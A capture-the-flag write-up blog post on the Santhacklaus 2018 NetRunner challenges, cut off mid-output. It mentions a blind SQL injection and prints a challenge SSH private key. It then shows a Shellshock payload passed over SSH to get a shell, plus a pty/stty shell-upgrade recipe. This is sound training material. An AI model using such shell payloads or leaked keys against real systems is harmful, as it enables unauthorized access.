@@ -1,0 +1,372 @@
+<!doctype html><html lang=en><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=robots content="noodp"><title>[Santhacklaus 2018] - NetRunner - Maki's adventure | Internet of things, IoT, ICS, forensic, pentest, red team & more :)</title><meta name=Description content="Maki's adventure | Internet of things, IoT, ICS, forensic, pentest, red team & more :)"><meta property="og:title" content="[Santhacklaus 2018] - NetRunner"><meta property="og:description" content="NetRunner 1/3 Statement State of the art Ok, we got a sexy website:
+A login form, we don&rsquo;t have to use scanner or something like that, I want to say &ldquo;SQL injection&rdquo;.
+After several tries, indeed, it&rsquo;s a full blind sql injection:
+Bypass I could try to script something or use SQLMap to extract all the database. And it&rsquo;s probably that&rsquo;s what I would have done before SIGSEGv1 event.
+I was near Geluchat during the CTF and he first blooded one of the hardest web challenge."><meta property="og:type" content="article"><meta property="og:url" content="maki.bzh/writeups/santhacklaus2018netrunner/"><meta property="og:image" content="/logo.png"><meta property="article:section" content="writeups"><meta property="article:published_time" content="2018-12-19T21:57:40+08:00"><meta property="article:modified_time" content="2018-12-19T21:57:40+08:00"><meta property="og:site_name" content="Maki's adventure | Internet of things, IoT, ICS, forensic, pentest, red team & more :)"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="/logo.png"><meta name=twitter:title content="[Santhacklaus 2018] - NetRunner"><meta name=twitter:description content="NetRunner 1/3 Statement State of the art Ok, we got a sexy website:
+A login form, we don&rsquo;t have to use scanner or something like that, I want to say &ldquo;SQL injection&rdquo;.
+After several tries, indeed, it&rsquo;s a full blind sql injection:
+Bypass I could try to script something or use SQLMap to extract all the database. And it&rsquo;s probably that&rsquo;s what I would have done before SIGSEGv1 event.
+I was near Geluchat during the CTF and he first blooded one of the hardest web challenge."><meta name=application-name content="Maki's adventure | Internet of things, IoT, ICS, forensic, pentest, red team & more :)"><meta name=apple-mobile-web-app-title content="Maki's adventure | Internet of things, IoT, ICS, forensic, pentest, red team & more :)"><meta name=theme-color content="#ffffff"><meta name=msapplication-TileColor content="#da532c"><link rel="shortcut icon" type=image/x-icon href=/favicon.ico><link rel=icon type=image/png sizes=32x32 href=/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=/favicon-16x16.png><link rel=apple-touch-icon sizes=180x180 href=/apple-touch-icon.png><link rel=mask-icon href=/safari-pinned-tab.svg color=#5bbad5><link rel=manifest href=/site.webmanifest><link rel=canonical href=maki.bzh/writeups/santhacklaus2018netrunner/><link rel=prev href=maki.bzh/writeups/ecw2018admyssion/><link rel=next href=maki.bzh/writeups/santhacklaus2018missionimpossible/><link rel=stylesheet href=/maki.bzh/css/style.min.css><link rel=preload href=https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css as=style onload="this.onload=null,this.rel='stylesheet'"><noscript><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css></noscript><link rel=preload href=https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css as=style onload="this.onload=null,this.rel='stylesheet'"><noscript><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css></noscript><script type=application/ld+json>{"@context":"http://schema.org","@type":"BlogPosting","headline":"[Santhacklaus 2018] - NetRunner","inLanguage":"en","mainEntityOfPage":{"@type":"WebPage","@id":"maki.bzh\/writeups\/santhacklaus2018netrunner\/"},"image":["\/images\/Apple-Devices-Preview.png"],"genre":"writeups","keywords":"santhacklaus, pinkflood, pentest, web, xxe, oob, sqli, ngrok","wordcount":1088,"url":"maki.bzh\/writeups\/santhacklaus2018netrunner\/","datePublished":"2018-12-19T21:57:40+08:00","dateModified":"2018-12-19T21:57:40+08:00","license":"This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher":{"@type":"Organization","name":"xxxx","logo":"\/lib\/images\/avatar.png"},"author":{"@type":"Person","name":"Maki"},"description":""}</script></head><body data-header-desktop=fixed data-header-mobile=auto><script type=text/javascript>(window.localStorage&&localStorage.getItem('theme')?localStorage.getItem('theme')==='dark':'dark'==='auto'?window.matchMedia('(prefers-color-scheme: dark)').matches:'dark'==='dark')&&document.body.setAttribute('theme','dark')</script><div id=mask></div><div class=wrapper><header class=desktop id=header-desktop><div class=header-wrapper><div class=header-title><a href=maki.bzh/ title="Maki's adventure | Internet of things, IoT, ICS, forensic, pentest, red team & more :)"><span class=header-title-pre><i class='far fa-kiss-wink-heart fa-fw' aria-hidden=true></i></span></a></div><div class=menu><div class=menu-inner><a class=menu-item href=/maki.bzh/posts/>Posts </a><a class=menu-item href=/maki.bzh/shorts/>Shorts </a><a class=menu-item href=/maki.bzh/offers/>Offers </a><a class=menu-item href=/maki.bzh/writeups/>Writeups </a><a class=menu-item href=/maki.bzh/tags/>Tags </a><a class=menu-item href=/maki.bzh/about/>About </a><span class="menu-item delimiter"></span><a href=javascript:void(0); class="menu-item theme-switch" title="Switch Theme">
+<i class="fas fa-adjust fa-fw" aria-hidden=true></i></a></div></div></div></header><header class=mobile id=header-mobile><div class=header-container><div class=header-wrapper><div class=header-title><a href=maki.bzh/ title="Maki's adventure | Internet of things, IoT, ICS, forensic, pentest, red team & more :)"><span class=header-title-pre><i class='far fa-kiss-wink-heart fa-fw' aria-hidden=true></i></span></a></div><div class=menu-toggle id=menu-toggle-mobile><span></span><span></span><span></span></div></div><div class=menu id=menu-mobile><a class=menu-item href=/maki.bzh/posts/ title>Posts</a><a class=menu-item href=/maki.bzh/shorts/ title>Shorts</a><a class=menu-item href=/maki.bzh/offers/ title>Offers</a><a class=menu-item href=/maki.bzh/writeups/ title>Writeups</a><a class=menu-item href=/maki.bzh/tags/ title>Tags</a><a class=menu-item href=/maki.bzh/about/ title>About</a><a href=javascript:void(0); class="menu-item theme-switch" title="Switch Theme">
+<i class="fas fa-adjust fa-fw" aria-hidden=true></i></a></div></div></header><main class=main><div class=container><div class="page single special"><h1 class="single-title animate__animated animate__pulse animate__faster">[Santhacklaus 2018] - NetRunner</h1><div class=content id=content><h2 id=netrunner-13>NetRunner 1/3</h2><h3 id=statement>Statement</h3><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=/lib/images/writeups/2018_santhacklaus/netrunner/statement_netrunner1.png data-srcset="/lib/images/writeups/2018_santhacklaus/netrunner/statement_netrunner1.png, /lib/images/writeups/2018_santhacklaus/netrunner/statement_netrunner1.png 1.5x, /lib/images/writeups/2018_santhacklaus/netrunner/statement_netrunner1.png 2x" data-sizes=auto alt=/lib/images/writeups/2018_santhacklaus/netrunner/statement_netrunner1.png title=/lib/images/writeups/2018_santhacklaus/netrunner/statement_netrunner1.png></p><h3 id=state-of-the-art>State of the art</h3><p>Ok, we got a sexy website:</p><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=/lib/images/writeups/2018_santhacklaus/netrunner/netrunner1_1.png data-srcset="/lib/images/writeups/2018_santhacklaus/netrunner/netrunner1_1.png, /lib/images/writeups/2018_santhacklaus/netrunner/netrunner1_1.png 1.5x, /lib/images/writeups/2018_santhacklaus/netrunner/netrunner1_1.png 2x" data-sizes=auto alt=/lib/images/writeups/2018_santhacklaus/netrunner/netrunner1_1.png title=/lib/images/writeups/2018_santhacklaus/netrunner/netrunner1_1.png></p><p>A login form, we don&rsquo;t have to use scanner or something like that, I want to say &ldquo;SQL injection&rdquo;.</p><p>After several tries, indeed, it&rsquo;s a full blind sql injection:</p><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=/lib/images/writeups/2018_santhacklaus/netrunner/netrunner1_2.gif data-srcset="/lib/images/writeups/2018_santhacklaus/netrunner/netrunner1_2.gif, /lib/images/writeups/2018_santhacklaus/netrunner/netrunner1_2.gif 1.5x, /lib/images/writeups/2018_santhacklaus/netrunner/netrunner1_2.gif 2x" data-sizes=auto alt=/lib/images/writeups/2018_santhacklaus/netrunner/netrunner1_2.gif title=/lib/images/writeups/2018_santhacklaus/netrunner/netrunner1_2.gif></p><h3 id=bypass>Bypass</h3><p>I could try to script something or use SQLMap to extract all the database. And it&rsquo;s probably that&rsquo;s what I would have done before SIGSEGv1 event.</p><p>I was near Geluchat during the CTF and he first blooded one of the hardest web challenge. He also explained me how he did. During his SQL injection he played with <code>LIMIT</code> SQL statement, let&rsquo;s try here:</p><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=/lib/images/writeups/2018_santhacklaus/netrunner/netrunner1_3.gif data-srcset="/lib/images/writeups/2018_santhacklaus/netrunner/netrunner1_3.gif, /lib/images/writeups/2018_santhacklaus/netrunner/netrunner1_3.gif 1.5x, /lib/images/writeups/2018_santhacklaus/netrunner/netrunner1_3.gif 2x" data-sizes=auto alt=/lib/images/writeups/2018_santhacklaus/netrunner/netrunner1_3.gif title=/lib/images/writeups/2018_santhacklaus/netrunner/netrunner1_3.gif></p><h3 id=flag>Flag</h3><blockquote><p>IMTLD{w3b_1nT3rf4ceS_4r3_3v1L}</p></blockquote><h2 id=netrunner-23>NetRunner 2/3</h2><table><thead><tr><th>Event</th><th>Challenge</th><th>Category</th><th>Points</th><th>Solves</th></tr></thead><tbody><tr><td>Santhacklaus</td><td>NetRunner 2/3</td><td>App-Script</td><td>750</td><td>18</td></tr></tbody></table><h3 id=statement-1>Statement</h3><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=/lib/images/writeups/2018_santhacklaus/netrunner/statement_netrunner2.png data-srcset="/lib/images/writeups/2018_santhacklaus/netrunner/statement_netrunner2.png, /lib/images/writeups/2018_santhacklaus/netrunner/statement_netrunner2.png 1.5x, /lib/images/writeups/2018_santhacklaus/netrunner/statement_netrunner2.png 2x" data-sizes=auto alt=/lib/images/writeups/2018_santhacklaus/netrunner/statement_netrunner2.png title=/lib/images/writeups/2018_santhacklaus/netrunner/statement_netrunner2.png></p><h3 id=state-of-the-art-1>State of the art</h3><p>At the end of the previous challenge we got the SSH private key of <strong>puppet-master</strong> user:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span><span class=lnt>36
+</span><span class=lnt>37
+</span><span class=lnt>38
+</span><span class=lnt>39
+</span><span class=lnt>40
+</span><span class=lnt>41
+</span><span class=lnt>42
+</span><span class=lnt>43
+</span><span class=lnt>44
+</span><span class=lnt>45
+</span><span class=lnt>46
+</span><span class=lnt>47
+</span><span class=lnt>48
+</span><span class=lnt>49
+</span><span class=lnt>50
+</span><span class=lnt>51
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>-----BEGIN RSA PRIVATE KEY-----
+</span></span><span class=line><span class=cl>MIIJJwIBAAKCAgEA5nJEI+VHIE8eUE0Upf8eTGorOC5Cd0AVQGdgJLZPQNdcrgvu
+</span></span><span class=line><span class=cl>j9Pq1Jf90iAI7tt/2CybZlfegYJW3gN08n4kVWXd0ihO9Xpn4IxOA0dGApZ9Tnux
+</span></span><span class=line><span class=cl>5G4LF9kQDEMWgQP8v0M1z5v4vnqeyvrPMNdkBKrJHm5GqOT4sSinbU509cPsyggf
+</span></span><span class=line><span class=cl>utfJgbCtsuwPR56GRdc/nhH4NZGjTOgqy1dG8VSATcyf/j5WohG5G4aTCYUeyEy5
+</span></span><span class=line><span class=cl>3YYKesbgIdHW+0TUCwTNXRGrlHSEfJEjbvQaQDtCi/v6IhGsA6xr/TkxrNvZBAfn
+</span></span><span class=line><span class=cl>Ol+IAL7w5vmjXFIDG0HQOca5QUyUgO2S9Fr0NTE/dNf9pQt+eH51GY068MZ1rw5q
+</span></span><span class=line><span class=cl>kxixhTMUsMRFMm5lF4hskxnosyIY2sW2MX9VuxQ9tweTA3vyNb7OxXNB+Hsa2qBK
+</span></span><span class=line><span class=cl>+G8cT/tooQN8qYXXdyNN6LzqqDIadL1NRkg2uYu0h5ZZu+mf4LhRYn8Ocau3+w2S
+</span></span><span class=line><span class=cl>nOKjqMjiiAi1G4V/3G2bHjo49I7dPjaGCBasAZIv4N+9qeLkd9u6lNVnHFxJbU52
+</span></span><span class=line><span class=cl>+5Rw+IWEp80IpxZRxRHSJQhZdAHTuyu8SLBX4mRD3SRFG4rsZqSNDwGwPu+VfL6k
+</span></span><span class=line><span class=cl>4Ih1vwZs9WyUrl9q8g2zZYthMyqND3SvHtL6tF3RXkzjaI1uXZF29lS8VpMCAwEA
+</span></span><span class=line><span class=cl>AQKCAgAbHv2X/+bkDYuyxa+VbbYCJkiZ3w/hewBFSSVOjMo9BluY/DyCXt13UcAE
+</span></span><span class=line><span class=cl>l9KVUe304iMT42mDcnSIwn1kAKaECm4VyrqoN1S8X6bayeuaaF2s++/Ow4i4sMor
+</span></span><span class=line><span class=cl>t0WRv4didyWBHoki2cmQd/4kcGUMC5GJ7E6SmAgQyYkS2zX2qq1Whag+VCEaC1IW
+</span></span><span class=line><span class=cl>CaQuuKBy3cdV8iV1IIPIjFZlAguOYXSMM3Xs9Sc7Abz4WVk6uJkL18PUJ29aTceZ
+</span></span><span class=line><span class=cl>E1oqzknqVhFZT7gSy7e/9VDnQQFJ5++IDAq/Mbc942/+KFoJTwJ2b/utqgqWk+JE
+</span></span><span class=line><span class=cl>PMMWHWzSK2e3NQUeg0XC+rLd4Up2Mvc3RWzcu21UiSY2VvEu0w+WMQiQG/TYapBS
+</span></span><span class=line><span class=cl>dO6iJNiIB79wFj/gNIA/NHBcNM37N27FLFt4/WOsANEXG8f2lKjpZXRhXyOrWk8T
+</span></span><span class=line><span class=cl>SwYf0AuSUbLf215Ln49ROXrJ7tMUUKDAZjeDwG7kte20KS6FOt604n8EVcEFNU63
+</span></span><span class=line><span class=cl>n05AIBiynMqjfLWJpgSmhw4jTpZOd3VRsV22PvEqxWNxtMZaVIhZvYBIGasRl7Q5
+</span></span><span class=line><span class=cl>kak8wq14utACtRm/K2vUQ13SY8afP3YbA3ph+BYmmcqQPBVrPVrRxSJinpu6jydV
+</span></span><span class=line><span class=cl>cxRaeR24V+YMnTabIEJXjNb3ZpwyM8YbYjuCLm5JYAEygA3ISQKCAQEA+ssdg5Iw
+</span></span><span class=line><span class=cl>X9Bdq/ezqAfmmxCGZSRDsRn65Av2fGh4RHDlTu1JrMZwbP7QF7gBTZbPeNoo+dH8
+</span></span><span class=line><span class=cl>JFCl6PzRKUc2DwZf/ibRIxeWGTz7PxeQRJaletgJ2v6lb+XucSlW2c4lllRj20tP
+</span></span><span class=line><span class=cl>4CTE0M2w0olenZPJzULhbvGasSrP3q7CP+LbwbWV9JPNmhZc/VufAXdc7R57P8D9
+</span></span><span class=line><span class=cl>CFwOVIJ/2xYThohWDuBTMmTsB+t9TdKhblUavT7FPXv730DDBHTX0YOM+6sNXOiT
+</span></span><span class=line><span class=cl>P19L9WUcvxdGrwbeCNBsgTK40XEuWcFGGvY5+Xz6iqJullncuLXsz5tpjXvvaA6N
+</span></span><span class=line><span class=cl>HEJgHMMMntljDwKCAQEA6zsDTYL7lM9DdwZLI3KkERguYfS5ABJVY577OfxJ/x2O
+</span></span><span class=line><span class=cl>Uc97KAgw1pv+PlqR3n9LBD0iFIDkh6LX4EWo2cri7axkHi6uRC8gpIVoj2ifTnvJ
+</span></span><span class=line><span class=cl>avOcoDMBiQ1/3XtpjYH/VxY5EshCBPIPTDwIRbSfgWGz8xR1j1Tj1HnJsCcX+WnM
+</span></span><span class=line><span class=cl>i7n6Ekxa6hRcq1pTax204gNirnHZ8CjVHTNmHzCBDjjmdoS2/RNGlPh7DfiBddx9
+</span></span><span class=line><span class=cl>cnS4zmbFMsVuAdZNRSfwtIaKfYg6z/ppYZ34vnoO9k65Q66Ov0J0VnF8LnrviYT3
+</span></span><span class=line><span class=cl>nl9bufmrjr2+GJdw0vXZ/+LBB5XycfxvKFhbLmSEPQKCAQAEmI5M5/Ps/ZOJ4Dsx
+</span></span><span class=line><span class=cl>nBt0wgPEfLqk1zYK0dFNjFiP4IXDQYP1H5nV1YGYva2Ab4AT1eOkWF3HiJbRwzhO
+</span></span><span class=line><span class=cl>ClkKQ3Kk5K82dmswwTZVfKgPKbeUnbrogXwkpdENz9Ugnq9/psJBtYqcL/BPZ0WT
+</span></span><span class=line><span class=cl>RiMuvhOXqF8bOmA8WO2ARjGXHCAs15gM6Fx/M2O23OP4EejpC4L0syOv8IfusomH
+</span></span><span class=line><span class=cl>SUtITt1M3n2H0eOlbYJZV7/Pls2rpCfXLZt7BuPMBBwkYcXGoubWyghQw/1PXO/+
+</span></span><span class=line><span class=cl>7H1GHdkZzj/+yiAq7mkMCgev3M1JLiolOj7OkI0D8YmKcG2pwxirDoE1gF3kiQqF
+</span></span><span class=line><span class=cl>KrSvAoIBAB8eeXthnqK7ILO4U2xnGClix5AR7f+CbWV2fMnZBHkJkfBkwGg1XTCn
+</span></span><span class=line><span class=cl>BmV9WdrTgDsZU07fFlyTQHfc/0+AtbC3o68Sgd9nVKwvMfv23Uxmt+i8PbY7yTI2
+</span></span><span class=line><span class=cl>ZPoJ/5bG4d7Fg9tmPsWkuD1fm8CM+qUFJec8h6jklBdh3Tq+kT9frb22ZszQ6R4a
+</span></span><span class=line><span class=cl>f3/zvSFolqtnw0BMs4ZAAKGSUSpDIm+dO2/mcsbcK/Q9QxpAC/BpsPbZVjGICwKC
+</span></span><span class=line><span class=cl>d+EqVqKVfBSF0AB3a0BkYliVq3iXcS9Ijt3TU/MdeYKOFN2ZSeMpghCjkODzlKyX
+</span></span><span class=line><span class=cl>kXRzZGukNqjReLPmNGK8AICX38gtaAkCggEAak/jrDw1ENeq2SfgCXyWEmagej2E
+</span></span><span class=line><span class=cl>+QYCZBg+ladH1C/6RgWJmWdckpqwe1wuO1o+Ish6DiFXNW6FNKjQeoBxOUZTix3/
+</span></span><span class=line><span class=cl>3cVH+cXsgSyAUMbPLneQh62pcNnR5vDwgAdXNSzYegzl9yL3kfl4s9foahIh4zqZ
+</span></span><span class=line><span class=cl>hqnFA1cG9zAcsd9Thy9f/3cz2iVvTpDZZ9glQR9d9C+3bnFU54uzdUKPYVEif3NU
+</span></span><span class=line><span class=cl>K1xreCkmAWdrAHhiA89skiVryPK3pVOKjHnAfyLrf27aZkiS3jvq/V+DDstKNZ2y
+</span></span><span class=line><span class=cl>ncjE2bXV8Kbzf5ifvikciUMTxnF7l+PehJulNP2+Mk5NBXOAcZdjO7sfxA==
+</span></span><span class=line><span class=cl>-----END RSA PRIVATE KEY-----
+</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ ssh -i /home/maki/Documents/chall/imtld/netrunnners/priv.key puppet-master@51.75.202.113 -p <span class=m>2021</span>   
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>.___..___.___..__..___..___ __ .  .
+</span></span><span class=line><span class=cl>  _/ <span class=o>[</span>__   <span class=p>|</span>  <span class=o>[</span>__<span class=o>]</span>  <span class=p>|</span>  <span class=o>[</span>__ /  <span class=sb>`</span><span class=p>|</span>__<span class=p>|</span>
+</span></span><span class=line><span class=cl>./__.<span class=o>[</span>___  <span class=p>|</span>  <span class=p>|</span>  <span class=p>|</span>  <span class=p>|</span>  <span class=o>[</span>___<span class=se>\_</span>_.<span class=p>|</span>  <span class=p>|</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Do not use Zetatech maintenance interface <span class=k>if</span> you are not authorized by Zetatech Corporation.
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>████████████████████████████ CONNECTION ESTABLISHED ████████████████████████████
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>----------------------------- General Informations -----------------------------
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Software Version     ::: 10.5.2546_b1 <span class=o>[</span>OBSOLETE<span class=o>]</span>
+</span></span><span class=line><span class=cl>Client ID            ::: 1534D <span class=m>4245</span> <span class=m>97554</span> P
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>General health       ::: <span class=o>[</span>ALIVE<span class=o>]</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Management interface ::: <span class=o>[</span>ONLINE<span class=o>]</span>
+</span></span><span class=line><span class=cl>Maintenance link     ::: <span class=o>[</span>ONLINE<span class=o>]</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>----------------------- Installed Cybernetic Prosthetics -----------------------
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Zetatech Neural Processor MK.II   ::: <span class=o>[</span>CONNECTION ERROR<span class=o>]</span>
+</span></span><span class=line><span class=cl>Zetatech Enforcement 10.A Sidearm ::: <span class=o>[</span>NOT CONNECTED<span class=o>]</span>
+</span></span><span class=line><span class=cl>Zetatech Binoculars BT.4          ::: <span class=o>[</span>NOT CONNECTED<span class=o>]</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Connection to 51.75.202.113 closed.
+</span></span></code></pre></td></tr></table></div></div><p>Ok, the server is printing the above message and immediatly close the ssh connection.</p><h3 id=exploitation>Exploitation</h3><p>In this challenge, you have to find a way to keep the session open. I first tried to use <code>-N</code> parameter of SSH, but it doesn&rsquo;t work.</p><p>So I asked to Google: <a href="http://lmgtfy.com/?q=ssh+immediate+disconnection+ctf" target=_blank rel="noopener noreffer">http://lmgtfy.com/?q=ssh+immediate+disconnection+ctf</a></p><p>And finally found this writeup: <a href=https://securitybytes.io/vulnhub-com-tr0ll2-ctf-walkthrough-9993042f8af8 target=_blank rel="noopener noreffer">https://securitybytes.io/vulnhub-com-tr0ll2-ctf-walkthrough-9993042f8af8</a></p><p>So, go on, I tried with a Shellshock payload:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ ssh -i /home/maki/Documents/chall/imtld/netrunnners/priv.key puppet-master@51.75.202.113 -p <span class=m>2021</span> <span class=s1>&#39;() { :;}; /bin/bash&#39;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>.___..___.___..__..___..___ __ .  .
+</span></span><span class=line><span class=cl>  _/ <span class=o>[</span>__   <span class=p>|</span>  <span class=o>[</span>__<span class=o>]</span>  <span class=p>|</span>  <span class=o>[</span>__ /  <span class=sb>`</span><span class=p>|</span>__<span class=p>|</span>
+</span></span><span class=line><span class=cl>./__.<span class=o>[</span>___  <span class=p>|</span>  <span class=p>|</span>  <span class=p>|</span>  <span class=p>|</span>  <span class=o>[</span>___<span class=se>\_</span>_.<span class=p>|</span>  <span class=p>|</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Do not use Zetatech maintenance interface <span class=k>if</span> you are not authorized by Zetatech Corporation.
+</span></span><span class=line><span class=cl>ls
+</span></span><span class=line><span class=cl>client.note
+</span></span><span class=line><span class=cl>status.sh
+</span></span><span class=line><span class=cl>tech.note
+</span></span><span class=line><span class=cl>id
+</span></span><span class=line><span class=cl><span class=nv>uid</span><span class=o>=</span>1001<span class=o>(</span>puppet-master<span class=o>)</span> <span class=nv>gid</span><span class=o>=</span>1001<span class=o>(</span>puppet-master<span class=o>)</span> <span class=nv>groups</span><span class=o>=</span>1001<span class=o>(</span>puppet-master<span class=o>)</span>
+</span></span></code></pre></td></tr></table></div></div><p>It work! But before going further, I want to have a fully functionnal bash: <a href=https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/ target=_blank rel="noopener noreffer">https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/</a></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># On remote server</span>
+</span></span><span class=line><span class=cl>$ which python3
+</span></span><span class=line><span class=cl>/usr/bin/python3
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>$ python3 -c <span class=s2>&#34;import pty;pty.spawn(&#39;/bin/bash&#39;)&#34;</span>
+</span></span><span class=line><span class=cl>puppet-master@2a87f3ade358:~$ <span class=c1># Do CTRL + Z to suspend to current job</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># On localhost</span>
+</span></span><span class=line><span class=cl>localhost $ stty raw -echo 
+</span></span><span class=line><span class=cl>localhost $ <span class=nb>fg</span> <span class=c1># It will not be display</span>
+</span></span><span class=line><span class=cl>localhost $ reset 
+</span></span><span class=line><span class=cl>reset: unknown terminal <span class=nb>type</span> unknown
+</span></span><span class=line><span class=cl>Terminal type? xterm
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># On remote server</span>
+</span></span><span class=line><span class=cl>puppet-master@2a87f3ade358:~$ id
+</span></span><span class=line><span class=cl><span class=nv>uid</span><span class=o>=</span>1001<span class=o>(</span>puppet-master<span class=o>)</span> <span class=nv>gid</span><span class=o>=</span>1001<span class=o>(</span>puppet-master<span class=o>)</span> <span class=nv>groups</span><span class=o>=</span>1001<span class=o>(</span>puppet-master<span class=o>)</span>
+</span></span></code></pre></td></tr></table></div></div><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=/lib/images/writeups/2018_santhacklaus/netrunner/netrunner1_4.gif data-srcset="/lib/images/writeups/2018_santhacklaus/netrunner/netrunner1_4.gif, /lib/images/writeups/2018_santhacklaus/netrunner/netrunner1_4.gif 1.5x, /lib/images/writeups/2018_santhacklaus/netrunner/netrunner1_4.gif 2x" data-sizes=auto alt=/lib/images/writeups/2018_santhacklaus/netrunner/netrunner1_4.gif title=/lib/images/writeups/2018_santhacklaus/netrunner/netrunner1_4.gif></p><p>And now we got auto-completion, we can use CTRL + C, we can edit files with vim :D</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>puppet-master@2a87f3ade358:~$ cat client.note 
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>.___..___.___..__..___..___ __ .  .
